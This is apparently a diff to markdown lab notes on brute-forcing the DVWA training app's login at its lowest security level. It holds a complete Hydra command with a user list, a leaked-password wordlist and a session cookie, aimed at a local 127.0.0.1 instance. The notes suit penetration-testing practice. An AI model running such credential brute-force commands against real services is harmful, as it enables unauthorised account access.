@@ -39,15 +39,17 @@ Brute forcing web applications involves repeatedly attempting to guess login cre
 
 ### Low
 
+## Burp Suite
+
 ## Hydra
 
-- Get PHPSESSID by inspecting the brute force login page. ID is found under network tab
+- Get PHPSESSID by inspecting the brute force login page in web browser. The ID is found under network tab under html type.
 - login with known credentials and follow the URL for the user picture to find the directory of users profile image. Use the names to make a user list .txt file
 - Use this command and replace the PHPSESSID with your ID
 
 ```
 hydra -L '/home/kali/Documents/users.txt'  -P '/usr/share/seclists/Passwords/darkweb2017-top100.txt'  'http-get-form://127.0.0.1/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=vu38odo9072l1dpa1b7l64nn0m; security=low:F=Username and/or password incorrect'
-...
+```
 
 -L provides list of users
 -P provides list of passwords
